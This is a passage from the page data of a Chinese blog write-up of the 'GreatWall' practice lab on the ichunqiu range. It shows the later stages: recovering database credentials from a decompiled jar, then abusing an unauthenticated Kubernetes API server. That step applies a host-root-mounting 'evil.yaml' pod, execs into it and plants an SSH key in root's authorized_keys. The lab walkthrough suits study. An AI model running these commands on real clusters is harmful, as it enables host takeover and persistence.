class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 1\n\n\u003cspan class=\"hljs-comment\"\u003e# start\u003c/span\u003e\njava -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar\n/usr/bin/tail -f /dev/null#                                                                                                                                                                                                         \n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al app  \n总计 28888\ndrwxrwxrwx 2 root root     4096 2024年 3月25日 .\ndrwxr-xr-x 7 root root     4096  3月29日 12:54 ..\n-rwxrwxrwx 1 root root 29573051 2024年 3月25日 ProjectAdmin-0.0.1-SNAPSHOT.jar\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003eProjectAdmin-0.0.1-SNAPSHOT.jar\u003c/code\u003e拿到\u003ccode\u003eJD-gui\u003c/code\u003e中反编译\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在spring配置文件中能找到数据库账号密码\u003ccode\u003eroot:My3q1i4oZkJm3\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e新建规则\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再通过\u003ccode\u003eMDUT\u003c/code\u003e进行连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接梭哈\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image61.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取\u003ccode\u003eflag06\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{413ac6ad-1d50-47cb-9cf3-17354b751741}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e172.22.14.37 - K8s\u003c/h2\u003e\n\u003cp\u003ePS：K8S一点不会，看着WP打的\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003efscan\u003c/code\u003e扫描，\u003ccode\u003e172.22.14.37\u003c/code\u003e开启了10250端口，也就是\u003ccode\u003eK8s\u003c/code\u003e的端口（云安全方面）\u003c/p\u003e\n\u003cp\u003e通过上面的方法扫描一次\u003ccode\u003e172.22.14.37\u003c/code\u003e 的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.37 -p 1-65535 \u003e 1.txt\n(www-data:/var/www/html/OAsystem/upload) $ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 1.txt\n172.22.14.37:22 open\n172.22.14.37:2380 open\n172.22.14.37:2379 open\n172.22.14.37:6443 open\n172.22.14.37:10256 open\n172.22.14.37:10250 open\n172.22.14.37:10252 open\n172.22.14.37:10251 open\n[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None\n[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None\n[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None\n[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None\n[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None\n[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak \n[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在\u003ccode\u003e6443\u003c/code\u003e等端口，存在 \u003ccode\u003eKubernetes API server\u003c/code\u003e 未授权访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image62.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ekubectl.exe\u003c/code\u003e：\u003ca href=\"https://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/windows/amd64/kubectl.exe\"\u003ehttps://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/windows/amd64/kubectl.exe\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e编写恶意\u003ccode\u003eyaml\u003c/code\u003e文件\u003ccode\u003eevil.yaml\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eapiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        volumeMounts:\n        - mountPath: /mnt\n          name: test-volume\n      volumes:\n      - name: test-volume\n        hostPath:\n          path: /\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil.yaml\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxx\"\u003c/span\u003e \u003e /mnt/root/.ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003essh\u003c/code\u003e私钥登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003essh -i /home/kali/.ssh/id_rsa root@172.22.14.37\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003euse flaghaha;\n\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from flag04;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==\nflag{da69c459-7fe5-4535-b8d1-15fff496a29f}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e见到自己的很多不足，以及很多没用过，比如最后的\u003ccode\u003eK8s\u003c/code\u003e 未授权，还有中间的\u003ccode\u003ePWN\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e后面补全\u003ccode\u003eK8s\u003c/code\u003e 的知识，以后再复盘该靶机\u003c/p\u003e","title":"春秋云镜 - GreatWall","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","综合靶场"],"categories":"靶机","description":"GreatWall\n\n https://yunjing.ichunqiu.com/major/detail/1171?type=2\n \n\n\n\n8.130.146.145\n\n前期踩点\n\n\n\n访问`HTTP`服务，并提取指纹\n\n\n\n访问`8080`端口，是管理页面\n\n\n\nWEB渗透 - 1\n\n手动测试了以下弱密码等方法，但是根本没有将数据传过去，使用`fscan`扫描一波\n\n\n\n扫描出存在`Think..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"春秋云镜GreatWall"},"buildId":"PJghSypTuWEFTtl66wJg-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>